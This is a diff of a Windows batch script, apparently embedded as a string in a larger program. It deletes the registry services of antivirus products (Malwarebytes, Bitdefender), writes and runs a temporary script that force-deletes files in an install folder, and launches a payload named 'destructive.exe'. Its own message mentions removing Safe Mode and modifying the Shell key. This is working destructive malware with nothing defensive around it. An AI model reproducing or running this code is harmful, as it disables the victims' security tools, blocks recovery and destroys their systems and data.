@@ -257,23 +257,38 @@ reg delete "HKLM\SYSTEM\ControlSet001\Services\MBAMService" /f
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\VSSERV" /f
 reg delete "HKLM\SYSTEM\ControlSet001\Services\VSSERV" /f
 
-start "C:\Program Files\utkudrk2\destructive.exe"
-
 setlocal enabledelayedexpansion
 
 set "targetDir=C:\Program Files\utkudrk2"
 set "exceptionFile=destructive.exe"
 
-if exist "%targetDir%" (
-    for %%F in ("%targetDir%\*") do (
-        if /I not "%%~nxF"=="%exceptionFile%" (
-            del /f /q "%%F"
-        )
-    )
-)
+:: Create a temporary batch file for cleanup
+set "tempBatchFile=%TEMP%\cleanup.bat"
 
-:: Confirm completion
-echo Cleanup tasks completed. Safe Mode should now be removed, destructive.exe is scheduled to run, and Shell key is modified.
+echo @echo off > "%tempBatchFile%"
+echo setlocal enabledelayedexpansion >> "%tempBatchFile%"
+echo set targetDir="%targetDir%" >> "%tempBatchFile%"
+echo set exceptionFile="%exceptionFile%" >> "%tempBatchFile%"
+echo if exist "!targetDir!" ( >> "%tempBatchFile%"
+echo     for %%F in ("!targetDir!\*") do ( >> "%tempBatchFile%"
+echo         if /I not "%%~nxF"=="!exceptionFile!" ( >> "%tempBatchFile%"
+echo             del /f /q "%%F" >> "%tempBatchFile%"
+echo         ) >> "%tempBatchFile%"
+echo     ) >> "%tempBatchFile%"
+echo ) >> "%tempBatchFile%"
+echo :: Confirm completion >> "%tempBatchFile%"
+echo echo Cleanup tasks completed. Safe Mode should now be removed, destructive.exe is scheduled to run, and Shell key is modified. >> "%tempBatchFile%"
+echo endlocal >> "%tempBatchFile%"
+
+:: Run the cleanup batch file
+call "%tempBatchFile%"
+
+:: Run the destructive.exe
+"C:\Program Files\utkudrk2\destructive.exe"
+
+:: Clean up the temporary batch file
+del "%tempBatchFile%"
+
 endlocal
 exit
 "#;
